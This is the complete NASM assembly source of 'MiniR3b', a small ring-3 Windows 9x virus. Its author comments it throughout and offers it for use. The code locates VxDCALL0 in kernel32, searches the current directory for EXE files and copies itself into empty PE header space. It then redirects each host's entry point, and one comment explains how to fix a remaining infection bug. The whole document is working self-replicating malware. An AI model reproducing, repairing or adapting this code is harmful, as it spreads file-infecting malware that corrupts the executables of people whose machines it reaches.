   ;
   ; MiniR3b coded by Bumblebee
   ;
   ;  Disclaimer
   ;
   ;  This is the source of a VIRUS. Feel free to use at your will.
   ;  Notice that the author is not responsabile of the damages that
   ;  may occur due to the assembly of this file.
   ;
   ;  Here comes again MiniR3. This virus is the result of some wasted
   ;  hours playing with NASM. The behavior is quite the same of previous
   ;  release: infects PE EXE files in current directory adding the virus
   ;  to the empty space in PE header after section descs.
   ;
   ;  This time it does the job using stack and the infection algorithm
   ;  has been improved to archieve more stability. Still using VxDCALL0,
   ;  that's why it only works in win98 and later versions of win95.
   ;
   ;  Even is not very optimized... 378 bytes this time and ring3, enjoy!
   ;
   ; The way of the bee
   ;
   [extern __imp_MessageBoxA]

   [segment .text]
   [global main]

   KERNEL32        equ     0bff70000h

   struc           buffer
   .delta          resd    1
   .vxdcall0       resd    1
   .dta            resb    1024                    ; DTA is smaller, i know
   .buffer         resb    2048
   .fmask          resb    6
   endstruc

   buffSize        equ     (2*4)+(1024+2048+6)

   main:
   vBegin:
           push    dword fakeHost                  ; host ret addr
   hostEp  equ     $-4
           push    ebp
           mov     ebp,esp
           sub     esp,buffSize                    ; get tmp buffer
           pushad

           cmp     byte [esp+2bh+buffSize],0bfh    ; avoid non win9x
           je      win9x
           jmp     retHost
   win9x:
           call    delta                           ; get delta offset
   vname:  db      '[MiniR3b]'
   delta:  pop     edx
           sub     edx,dword vname

           mov     dword [ebp-buffer.delta-4],edx

           mov     esi,KERNEL32+3ch                ; scan for VxDCALL0
           lodsd                                   ; that's why only works
           add     eax,KERNEL32                    ; in win98 and later
           xchg    eax,esi                         ; win95...
           mov     esi,dword [esi+78h]
           add     esi,dword 1ch+KERNEL32
           lodsd
           mov     eax,dword [eax+KERNEL32]
           add     eax,KERNEL32

           mov     dword [ebp-buffer.vxdcall0-4],eax

           mov     ah,1ah                          ; set DTA
           mov     edx,ebp                         ; to our data buffer
           sub     edx,buffer.dta+1024
           call    int21h
           jc      retHost

           mov     dword [ebp-buffer.fmask-6],'*.ex' ; build find files mask
           mov     word [ebp-buffer.fmask-6+4],'e'

           mov     ah,4eh                          ; find 1st exe
           mov     edx,ebp
           sub     edx,buffer.fmask+6
           xor     ecx,ecx
   doNext:
           call    int21h
           jc      retHost

           mov     edx,ebp                         ; get name
           sub     edx,buffer.dta+1024
           add     edx,dword 01eh
           call    infection                       ; infect
           mov     ah,4fh                          ; find next

           jmp     doNext
   retHost:
           popad
           leave
           ret
   int21h:                                         ; int 21h using
           push    ecx                             ; VxDCALL0 services
           push    eax
           push    dword 002a0010h
           call    dword [ebp-buffer.vxdcall0-4]
           ret

   infection:
           mov     ax,word 3d02h                   ; open file
           call    int21h
           jnc     openok
           ret
   openok:
           xchg    eax,ebx

           mov     ah,byte 3fh                     ; read 2kbs
           mov     ecx,dword 2048
           mov     edx,ebp
           sub     edx,dword buffer.buffer+2048
           call    int21h
           jnc     readok
           jmp     errorInfC
   readok:
           mov     edi,edx                         ; test if EXE
           cmp     word [edi],'MZ'
           je      isMz
           jmp     errorInfC
   isMz:
           add     edi,dword [edi+3ch]             ; test if PE doing a
           add     edx,dword (1024-(vEnd-vBegin))  ; easy check to avoid
           cmp     edi,edx                         ; exceptions
           jae     errorInfC
           cmp     word [edi],'PE'
           jne     errorInfC

           mov     esi,edi                         ; skip image header and
           mov     eax,dword 18h                   ; optional header
           add     ax,word [edi+14h]
           add     edi,eax

           mov     ecx,dword [esi+06h]             ; search end of last
           mov     ax,word 28h                     ; section desc
           mul     cx
           add     edi,eax

           mov     ecx,dword (vEnd-vBegin)         ; test if there is space
           xor     eax,eax
           pushad
           rep     scasb
           popad
           jnz     errorInfC

           add     dword [esi+54h],vEnd-vBegin     ; expand the header

           mov     edx,edi                         ; store new ep and get old
           sub     edx,ebp
           add     edx,buffer.buffer+2048
           xchg    edx,dword [esi+28h]
           mov     eax,dword [esi+34h]
           add     edx,eax

           mov     esi,dword vBegin
           add     esi,[ebp-buffer.delta-4]        ; copy virus
           push    edi
           rep     movsb
           pop     edi
           mov     dword [edi+1],edx               ; host ep

   ;
   ; ARRRRGH! lil bug... eax should not be zero EVER :/
   ; if file being infected has 1st byte base addr!=0 AL won't
   ; be zero as i spected... That won't be frequent, but IT IS A BUG.
   ; What happens if the file has base address 40002h? hehe
   ;
   ; As i released the bin with this little problem, there is not fixed.
   ; Just change next asm line by: mov ax,4200h
   ;
           mov     ah,42h                          ; move BOF
           cdq                                     ; edx=0
           call    int21h                          ; after the rep movsb
           jc      errorInfC                       ; ecx is 0 too

           mov     ah,40h                          ; write to disk
           mov     ecx,2048
           mov     edx,ebp
           sub     edx,dword buffer.buffer+2048
           call    int21h

   errorInfC:
           mov     ah,3eh                          ; close the file
           call    int21h

   errorInf:
           ret

   vEnd:

   fakeHost:
           push    dword 0
           push    dword title
           push    dword message
           push    dword 0
           call    [__imp_MessageBoxA]

           ret

   [segment .data]

   title           db "MiniR3b by Bumblebee",0
   message         db "I hope you know you're running a virus.",0
